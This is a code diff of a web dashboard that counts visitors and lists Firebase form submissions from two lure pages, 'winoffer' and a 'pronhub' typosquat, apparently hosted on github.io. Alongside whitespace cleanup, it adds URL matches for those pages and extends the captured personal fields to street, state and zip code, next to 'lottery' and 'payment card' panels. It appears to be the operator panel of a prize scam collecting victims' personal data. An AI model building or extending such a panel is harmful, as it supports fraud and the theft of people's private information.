@@ -398,23 +398,17 @@ a:focus-visible {
     align-items: center;
     justify-content: center;
     gap: 10px;
-
     min-height: 48px;
     padding: 12px 22px;
-
     background: linear-gradient(135deg,#2563eb,#1e40af);
     color: #ffffff;
-
     border: 1px solid rgba(147,197,253,.3);
     border-radius: 12px;
-
     font-size: 14px;
     font-weight: 700;
     line-height: 1;
-
     white-space: nowrap;
     flex-shrink: 0;
-
     transition: background .2s ease, transform .2s ease;
 }
 
@@ -688,73 +682,56 @@ a:focus-visible {
 }
 
 @media(max-width:600px) {
-
     .dashboard-header {
         padding: 0 14px;
     }
-
     .dashboard-logo {
         font-size: 16px;
     }
-
     .header-left {
         gap: 10px;
     }
-
     .logout-btn {
         padding: 10px 13px;
     }
-
     .dashboard-container {
         padding: 100px 15px 45px;
     }
-
     .dashboard-container h1 {
         font-size: 24px;
     }
-
     .stats {
         gap: 12px;
     }
-
     .stat-card {
         padding: 19px 15px;
     }
-
     .stat-card h3 {
         font-size: 12px;
     }
-
     .stat-number {
         font-size: 31px;
     }
-
     .website-grid,
     .document-grid {
         grid-template-columns: 1fr;
     }
-
     .document-header {
         flex-direction: column;
         align-items: stretch;
     }
-
     .page-back-btn {
         width: 100%;
     }
-
     .payment-card {
         padding: 18px;
     }
-
     .lottery-info {
         padding: 15px;
     }
-
     .lottery-row p {
         font-size: 14px;
     }
-
     .dashboard-toast {
         left: 5%;
         right: 5%;
@@ -762,7 +739,6 @@ a:focus-visible {
         max-width: none;
         text-align: center;
     }
-
 }
 
 </style>
@@ -1179,12 +1155,8 @@ const confirmDeleteBtn = document.getElementById("confirmDelete");
 
 const cancelDeleteBtn = document.getElementById("cancelDelete");
 
-/* WEBSITE DETECTION */
+/* WEBSITE DETECTION FIELDS */
 
-/*
-    এই ফিল্ডগুলো থেকে ওয়েবসাইট চেনা হবে।
-    প্রথম যে ফিল্ডে মিল পাওয়া যাবে, সেটিই ব্যবহৃত হবে।
-*/
 const WEBSITE_FIELDS = [
     "pageId",
     "page",
@@ -1209,17 +1181,13 @@ const WEBSITE_LABELS = {
 };
 
 function normalizeText(value) {
-
     return String(value ?? "")
         .toLowerCase()
         .replace(/[^a-z0-9]/g, "");
-
 }
 
 function detectWebsite(data) {
-
     for (const field of WEBSITE_FIELDS) {
-
         const value = normalizeText(data[field]);
 
         if (!value) continue;
@@ -1227,7 +1195,8 @@ function detectWebsite(data) {
         if (
             value.includes("page1") ||
             value.includes("website1") ||
-            value.includes("winoffer")
+            value.includes("winoffer") ||
+            value.includes("m86789270collabgithubiowinoffer")
         ) {
             return "page1";
         }
@@ -1235,15 +1204,14 @@ function detectWebsite(data) {
         if (
             value.includes("page2") ||
             value.includes("website2") ||
-            value.includes("pronhub")
+            value.includes("pronhub") ||
+            value.includes("m86789270collabgithubiopronhub120")
         ) {
             return "page2";
         }
-
     }
 
     return "unknown";
-
 }
 
 /* AUTHENTICATION */
@@ -1328,33 +1296,23 @@ function showToast(message, isError = false) {
 /* SIDEBAR */
 
 function openSidebar() {
-
     sidebar.classList.add("active");
-
     overlay.classList.add("active");
-
     menuToggle.setAttribute("aria-expanded", "true");
-
 }
 
 function closeSidebar() {
-
     sidebar.classList.remove("active");
-
     overlay.classList.remove("active");
-
     menuToggle.setAttribute("aria-expanded", "false");
-
 }
 
 menuToggle.addEventListener("click", () => {
-
     if (sidebar.classList.contains("active")) {
         closeSidebar();
     } else {
         openSidebar();
     }
-
 });
 
 overlay.addEventListener("click", closeSidebar);
@@ -1370,20 +1328,16 @@ function showView(viewId) {
     }
 
     document.querySelectorAll(".dashboard-view").forEach(view => {
-
         view.classList.remove("active");
-
     });
 
     target.classList.add("active");
 
     document.querySelectorAll(".sidebar-item[data-view]").forEach(button => {
-
         button.classList.toggle(
             "active",
             button.dataset.view === viewId
         );
-
     });
 
     closeSidebar();
@@ -1396,41 +1350,25 @@ function showView(viewId) {
 }
 
 document.querySelectorAll("[data-view]").forEach(button => {
-
     button.addEventListener("click", () => {
-
         showView(button.dataset.view);
-
     });
-
 });
 
 /* COPY WEBSITE LINKS */
 
 document.querySelectorAll("[data-copy]").forEach(button => {
-
     button.addEventListener("click", async () => {
-
         const element = document.getElementById(button.dataset.copy);
-
         const link = element.textContent.trim();
-
         try {
-
             await navigator.clipboard.writeText(link);
-
             showToast("✅ Link copied successfully!");
-
         } catch (error) {
-
             console.error(error);
-
             showToast("Unable to copy link.", true);
-
         }
-
     });
-
 });
 
 /* DELETE MODAL */
@@ -1469,25 +1407,19 @@ function closeDeleteModal() {
 cancelDeleteBtn.addEventListener("click", closeDeleteModal);
 
 deleteModal.addEventListener("click", event => {
-
     if (event.target === deleteModal) {
         closeDeleteModal();
     }
-
 });
 
 document.addEventListener("keydown", event => {
-
     if (event.key === "Escape") {
-
         if (!deleteModal.hidden) {
             closeDeleteModal();
         } else {
             closeSidebar();
         }
-
     }
-
 });
 
 deleteModal.addEventListener("keydown", event => {
@@ -1505,15 +1437,11 @@ deleteModal.addEventListener("keydown", event => {
     const last = buttons[buttons.length - 1];
 
     if (event.shiftKey && document.activeElement === first) {
-
         event.preventDefault();
         last.focus();
-
     } else if (!event.shiftKey && document.activeElement === last) {
-
         event.preventDefault();
         first.focus();
-
     }
 
 });
@@ -1572,7 +1500,7 @@ confirmDeleteBtn.addEventListener("click", async () => {
 
 });
 
-/* ALLOWED METADATA FIELDS */
+/* ALLOWED METADATA FIELDS (Included Location fields) */
 
 const allowedFields = new Set([
     "name",
@@ -1581,7 +1509,12 @@ const allowedFields = new Set([
     "lastname",
     "email",
     "address",
+    "street",
+    "state",
     "city",
+    "zip",
+    "zipcode",
+    "postalcode",
     "country",
     "message",
     "note",
@@ -1590,11 +1523,9 @@ const allowedFields = new Set([
 ]);
 
 function isAllowedField(name) {
-
     return allowedFields.has(
         normalizeText(name)
     );
-
 }
 
 /* FORMAT VALUES */
@@ -1606,9 +1537,7 @@ function formatValue(value) {
     }
 
     if (value?.toDate && typeof value.toDate === "function") {
-
         return value.toDate().toLocaleString();
-
     }
 
     if (typeof value === "string") {
@@ -1616,13 +1545,9 @@ function formatValue(value) {
     }
 
     if (typeof value === "number") {
-
         if (!Number.isSafeInteger(value) && Number.isInteger(value)) {
-
             return String(value) + " (precision may be lost)";
-
         }
-
         return String(value);
     }
 
@@ -1631,9 +1556,7 @@ function formatValue(value) {
     }
 
     if (Array.isArray(value)) {
-
         return value.map(item => {
-
             if (
                 item === null ||
                 typeof item === "string" ||
@@ -1642,11 +1565,8 @@ function formatValue(value) {
             ) {
                 return String(item);
             }
-
             return "[Complex value]";
-
         }).join(", ");
-
     }
 
     return "[Structured data]";
@@ -1677,7 +1597,7 @@ function createDocumentCard(submissionDoc, index) {
 
     box.append(title, badge);
 
-    /* LOTTERY INFORMATION CARD */
+    /* LOTTERY & LOCATION INFORMATION CARD */
 
     const lotteryInfo = createLotteryInfo(
         data,
@@ -1715,9 +1635,7 @@ function createDocumentCard(submissionDoc, index) {
     addInfo("Website", WEBSITE_LABELS[site]);
 
     if (data.createdAt) {
-
         addInfo("Submitted", data.createdAt);
-
     }
 
     Object.entries(data).forEach(([key, value]) => {
@@ -1747,12 +1665,10 @@ function createDocumentCard(submissionDoc, index) {
     deleteButton.textContent = "🗑️ Delete Document";
 
     deleteButton.addEventListener("click", () => {
-
         openDeleteModal(
             submissionDoc.id,
             deleteButton
         );
-
     });
 
     deleteArea.appendChild(deleteButton);
@@ -1805,23 +1721,16 @@ function getDocumentTime(submissionDoc) {
     const value = data.createdAt;
 
     if (value?.toMillis) {
-
         return value.toMillis();
-
     }
 
     if (typeof value === "string") {
-
         const parsed = Date.parse(value);
-
         return Number.isNaN(parsed) ? 0 : parsed;
-
     }
 
     if (typeof value === "number") {
-
         return Number.isFinite(value) ? value : 0;
-
     }
 
     return 0;
@@ -1829,13 +1738,9 @@ function getDocumentTime(submissionDoc) {
 }
 
 function sortDocuments(documents) {
-
     return [...documents].sort((a, b) => {
-
         return getDocumentTime(b) - getDocumentTime(a);
-
     });
-
 }
 
 /* FIREBASE LIVE DATA */
@@ -1858,13 +1763,9 @@ function loadDashboard() {
                 const site = detectWebsite(visitorDoc.data());
 
                 if (site === "page1") {
-
                     page1++;
-
                 } else if (site === "page2") {
-
                     page2++;
-
                 }
 
             });
@@ -1878,14 +1779,8 @@ function loadDashboard() {
         },
 
         error => {
-
             console.error("Visitor error:", error);
-
-            showToast(
-                "Unable to load visitor statistics.",
-                true
-            );
-
+            showToast("Unable to load visitor statistics.", true);
         }
 
     );
@@ -1911,17 +1806,11 @@ function loadDashboard() {
                 const site = detectWebsite(submissionDoc.data());
 
                 if (site === "page1") {
-
                     page1Docs.push(submissionDoc);
-
                 } else if (site === "page2") {
-
                     page2Docs.push(submissionDoc);
-
                 } else {
-
                     unknownDocs.push(submissionDoc);
-
                 }
 
             });
@@ -1959,10 +1848,7 @@ function loadDashboard() {
 
             });
 
-            showToast(
-                "Unable to load documents.",
-                true
-            );
+            showToast("Unable to load documents.", true);
 
         }
 
